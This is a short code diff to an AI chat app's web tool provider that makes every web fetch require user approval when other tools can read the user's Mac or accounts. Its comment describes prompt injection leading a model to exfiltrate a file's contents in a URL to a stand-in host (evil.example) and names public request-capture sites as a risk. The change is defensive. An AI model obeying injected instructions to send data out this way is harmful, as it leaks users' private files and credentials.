@@ -113,8 +113,11 @@ export const webTools: ToolProvider = {
   },
   // web_fetch can carry data out in the URL it asks for (https://evil.example/?d=<a file's contents>). In a chat whose
   // other tools can read this Mac or the user's accounts, a page or tool result that tells the model to do that must
-  // not get through unseen, so fetches ask there, one site at a time. Searches go to Ollama's API, not to a site.
-  approval: ({ name }, ctx) => (name === 'web_fetch' && ctx.sources.length > 0 ? 'ask' : 'auto'),
+  // not get through unseen, so each fetch asks there. Allowing a site for the chat isn't offered: on hosts anyone can
+  // read requests from (webhook.site, Apps Script, request bins), one innocent-looking approval would let every later
+  // URL through. Searches go to Ollama's API, not to a site.
+  approval: ({ name }, ctx) => (name === 'web_fetch' && ctx.sources.length > 0 ? 'ask-every-time' : 'auto'),
+  // A denial covers the site for the rest of the reply.
   allowKey: ({ name, via, args }) => {
     const call = resolveWebCall(via ?? name, args)
     return call?.tool === 'web_fetch' ? webFetchAllowKey(hostOf(call.url)) : name
